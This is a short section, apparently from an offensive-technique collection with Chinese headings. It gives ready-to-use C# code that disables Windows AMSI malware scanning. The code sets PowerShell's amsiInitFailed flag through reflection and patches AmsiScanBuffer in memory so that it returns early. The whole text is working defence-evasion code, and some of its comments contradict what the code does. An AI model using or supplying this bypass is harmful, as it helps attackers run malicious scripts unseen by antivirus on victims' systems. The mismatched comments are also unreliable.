## 1. AMSI Bypass（C#，内存 patch amsi.dll 的 `AmsiScanBuffer`）

```csharp
using System;
using System.Runtime.InteropServices;

public class AmsiBypass
{
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string proc);
    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lp, uint size, uint flNew, out uint flOld);

    public static void Patch()
    {
        // 先清掉 amsiInitFailed 标志位（应对已 patch 的会话）
        try
        {
            var amsiUtils = typeof(System.Management.Automation.PSObject).Assembly
                .GetType("System.Management.Automation.AmsiUtils");
            amsiUtils?.GetField("amsiInitFailed", 
                System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static)
                ?.SetValue(null, true);
        }
        catch {}

        // patch AmsiScanBuffer：入口直接 return(1) → AMSI_RESULT_CLEAN
        IntPtr amsi = LoadLibrary("amsi.dll");
        IntPtr addr = GetProcAddress(amsi, "AmsiScanBuffer");
        // x64: mov eax, 0x80070057 (E_INVALIDARG); ret
        byte[] patch64 = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        // x86: mov eax, 0x80070057; ret
        byte[] patch86 = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

        VirtualProtect(addr, (uint)patch64.Length, 0x40, out uint old);
        Marshal.Copy(patch64, 0, addr, patch64.Length);
        VirtualProtect(addr, (uint)patch64.Length, old, out _);
    }
}
```

